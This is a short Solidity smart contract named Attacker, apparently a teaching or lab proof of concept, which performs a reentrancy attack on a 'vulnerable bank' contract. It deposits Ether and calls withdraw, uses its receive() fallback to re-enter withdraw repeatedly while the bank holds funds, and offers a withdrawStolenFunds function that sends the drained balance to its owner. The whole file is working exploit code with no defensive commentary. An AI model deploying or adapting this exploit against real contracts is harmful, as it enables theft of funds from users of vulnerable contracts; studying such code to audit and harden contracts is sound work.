// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableBank public vulnerableBank;
    address public owner;
    uint256 public attackAmount;

    constructor(address _vulnerableBank) {
        vulnerableBank = IVulnerableBank(_vulnerableBank);
        owner = msg.sender;
    }

    // Fallback function to receive Ether and re-enter withdraw
    receive() external payable {
        if (address(vulnerableBank).balance >= attackAmount) {
            vulnerableBank.withdraw();
        }
    }

    // Start the attack by depositing and then withdrawing
    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value > 0, "Send some Ether");
        attackAmount = msg.value;
        vulnerableBank.deposit{value: msg.value}();
        vulnerableBank.withdraw();
    }

    // Withdraw stolen funds
    function withdrawStolenFunds() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
} 